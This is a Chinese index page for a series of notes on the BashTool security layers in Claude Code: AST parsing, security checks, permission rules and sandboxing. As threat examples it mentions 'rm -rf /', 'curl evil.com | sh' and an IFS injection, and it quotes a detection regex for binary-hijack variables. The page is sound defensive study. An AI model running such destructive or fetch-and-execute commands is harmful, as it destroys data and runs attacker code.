# BashTool 安全沙箱与命令解析专题

> 基于 `claude-code@2.1.88` 还原源码（`claude-code-sourcemap/restored-src/`）。
> 行号对应当前快照；版本升级会漂移。

## 阅读顺序

| # | 文档 | 主题 | 你会学到 |
|---|---|---|---|
| 00 | [总览与代码地图](./00-总览与代码地图.md) | 总览 | 26K 行代码分区、5 层防御管线、威胁模型、与 prompt-injection 专题的关系 |
| 01 | [工具入口与 prompt 定义](./01-工具入口与prompt定义.md) | 入口 | `BashTool.tsx` call() 主流程、prompt.ts 拼接结构、4 种权限模式、background 与 persisted output |
| 02 | [命令解析管线](./02-命令解析管线.md) | 解析 | bash 字符串 → AST → ParsedCommand[]，tree-sitter WASM 集成、`splitCommand`、heredoc 处理、`stripSafeWrappers` |
| 03 | [AST 级 security 检查](./03-AST级security检查.md) | 内容安全 | `bashSecurity.ts` 2592 行：IFS injection / malformed token / metachar 检测、复合命令拆分检查 |
| 04 | [permission 决策核心](./04-permission决策核心.md) | 权限决策 | `bashPermissions.ts` 2621 行：wildcard 匹配、`BINARY_HIJACK_VARS` 防劫持、speculative classifier 预判 |
| 05 | [只读 vs 可写 + 路径校验](./05-只读vs可写与路径校验.md) | 行为分类 | `readOnlyValidation` 识别只读命令、`pathValidation` 拦截危险路径、grep/find/cat 等的语义识别 |
| 06 | [sed 与 wrapper specs](./06-sed与wrapper-specs.md) | 特殊处理 | sed 模拟执行（绕开 `sed -i` 不可逆性）+ 7 个 wrapper spec（timeout/sleep/nohup/alias/...） |
| 07 | [Sandbox 沙箱机制](./07-Sandbox沙箱机制.md) | 沙箱 | `shouldUseSandbox` 决策路径、`ISandboxManager` 接口、Darwin sandbox-exec profile、路径模式解析 |
| 08 | [执行层与环境](./08-执行层与环境.md) | 执行 | `Shell.ts` spawn 入口、`ShellSnapshot` 环境快照、`subprocessEnv` 隔离、provider 抽象（bash/pwsh）、abort 与超时 |
| 09 | [端到端模拟与设计哲学](./09-端到端模拟与设计哲学.md) | 收尾 | 一次"模型想跑危险命令"从输入到拦截的完整推演 + 设计哲学总结 |

## 一句话总结这个专题

让 LLM 跑 shell 命令是 agent 工程里最危险的能力——一旦失守，模型被骗就能直接 `rm -rf /` 或 `curl evil.com | sh`。Claude Code 用 **~26000 行代码**给 BashTool 加了 5 道闸门：**tree-sitter AST 解析 → AST 级安全检查 → permission 决策 → 沙箱执行 → 进程隔离**。每一道闸门独立，且都不假设上一道完美。

读完这个专题，你会理解：

- 为什么 BashTool 的代码量比 messages-pipeline 还大一倍；
- AST 级命令解析为什么是必须的（regex 防不住 `IFS=$'\n'` 这种攻击）；
- `BINARY_HIJACK_VARS = /^(LD_|DYLD_|PATH$)/` 这一行短短的正则在防什么；
- 为什么 `timeout 30 bazel run` 的权限应该按 `bazel run` 算，不是按 `timeout` 算；
- 为什么 `sed -i` 在 Claude Code 里不是真的执行 sed，而是被模拟成 FileEdit；
- Darwin sandbox-exec profile 是怎么把 LLM 跑的命令关进笼子的；
- 整个防御链路怎么和 [prompt-injection 专题](../prompt-injection/) 的 6 层防御互补。

## 关键源码地图

| 模块 | 文件 | 行数 |
|------|------|----:|
| 工具入口 | `tools/BashTool/BashTool.tsx` | 1143 |
| 工具 prompt | `tools/BashTool/prompt.ts` | 369 |
| AST 解析 | `utils/bash/bashParser.ts` + `ast.ts` + `treeSitterAnalysis.ts` | 7621 |
| 命令分割 | `utils/bash/commands.ts` + `bashPipeCommand.ts` + `ParsedCommand.ts` | 1951 |
| heredoc 处理 | `utils/bash/heredoc.ts` | 733 |
| **AST 级 security** | `tools/BashTool/bashSecurity.ts` | **2592** |
| **permission 决策** | `tools/BashTool/bashPermissions.ts` | **2621** |
| 只读 vs 可写 | `tools/BashTool/readOnlyValidation.ts` | 1990 |
| 路径校验 | `tools/BashTool/pathValidation.ts` | 1303 |
| sed 模拟 | `tools/BashTool/sedEditParser.ts` + `sedValidation.ts` | 1006 |
| wrapper specs | `utils/bash/specs/*.ts` (7 个) | ~250 |
| 沙箱判定 | `tools/BashTool/shouldUseSandbox.ts` | 153 |
| 沙箱适配 | `utils/sandbox/sandbox-adapter.ts` | 985 |
| 执行层 | `utils/Shell.ts` + `ShellSnapshot.ts` + `subprocessEnv.ts` | ~1500 |
| 辅助 | `utils.ts` / `commandSemantics` / `commentLabel` / `destructiveCommandWarning` / `modeValidation` | ~700 |
| **合计** | | **~26000** |

## 与其它专题的关系

- **[prompt-injection 专题](../prompt-injection/)**：那个专题讲"防 LLM 被骗"，本专题讲"被骗之后命令侧拦截"。bashPermissions/Security 是 prompt-injection 没展开的**动作侧护栏**——模型即使被诱导生成 `rm -rf /`，Bash 自己的 AST 检查也会再拦一次。
- **[messages-pipeline 专题](../messages-pipeline/)**：那个专题讲 user message 怎么发给 API，本专题讲 assistant 返回的 `tool_use` 怎么落到 OS 行为。两者覆盖 LLM agent 一次 turn 的两端。
- **[agent 专题](../agent/)**：sub-agent 在隔离环境里跑工具，BashTool 是其中最敏感的一项——和 sub-agent 的权限继承机制配合（详见 agent 07）。
- **[core-models 02 Tool](../core-models/02-Tool-工具的统一抽象.md)**：BashTool 是 Tool 统一抽象的具体实例，本专题深入它的实现。

下一篇 → [00 总览与代码地图](./00-总览与代码地图.md)
